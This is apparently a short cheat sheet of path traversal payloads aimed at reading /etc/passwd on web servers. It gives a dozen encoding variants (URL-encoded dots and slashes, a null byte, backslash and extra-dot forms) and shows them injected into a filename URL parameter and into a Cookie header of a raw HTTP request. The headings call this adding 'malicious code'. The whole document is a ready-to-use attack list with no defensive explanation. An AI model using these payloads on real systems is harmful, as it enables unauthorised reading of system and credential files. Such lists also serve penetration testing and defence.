## Code Group

```
passwd
../../../../etc/passwd
../../../../etc/passwd%00
…./…./…./…./etc/passwd
////etc/passwd
/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd  (../../../etc/passwd)
%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  (../../../../etc/passwd)
%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd(..\..\..\etc\passwd)
%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc/passwd(..\..\..\etc\passwd)
%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2e%2e%2e%2e%2fpasswd(..../…./etc/passwd)
\…..\\\…..\\\…..\\\etc\\passwd
/…..///…..///…..///etc//passwd
```


## Add malicious code to URL parameters.

```
https://test.com/image/?filename=../../../../etc/passwd
```


## Add malicious code to any field in the request header

```
GET /vulnerable.php HTTP/1.0
Cookie: TEMPLATE=../../../../../../../../../etc/passwd

```
